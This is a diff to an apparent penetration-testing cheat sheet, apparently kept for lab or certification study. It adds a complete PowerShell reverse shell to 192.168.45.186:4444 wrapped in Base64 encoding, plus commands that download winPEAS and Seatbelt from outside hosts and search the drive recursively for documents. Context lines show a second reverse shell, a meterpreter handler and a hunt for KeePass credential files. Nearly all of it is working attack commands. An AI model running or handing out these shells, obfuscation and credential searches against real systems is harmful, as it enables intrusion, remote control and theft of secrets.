@@ -29,8 +29,10 @@ $client = New-Object System.Net.Sockets.TCPClient('192.168.45.230',4444);$stream
 
 Base64 encoding for powershell
 ```
-$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text) 
-$EncodedText = [Convert]::ToBase64String($Bytes) 
+$MyBase6 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$client = New-Object System.Net.Sockets.TCPClient("192.168.45.186",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' ))
+
+$Bytes=[Convert]::FromBase64String($Text)
+[System.Text.Encoding]::Unicode.GetString($Bytes)
 ```
 
 msfconsole 
@@ -42,3 +44,13 @@ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse
 find using powershell
 
 Get-ChildItem -Path C:\ -Include \*.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+Get-ChildItem -Path C: -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+
+download powershell
+
+```
+iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
+iwr -uri http://192.168.45.204:9090/Seatbelt.exe -Outfile seat.exe
+```
+
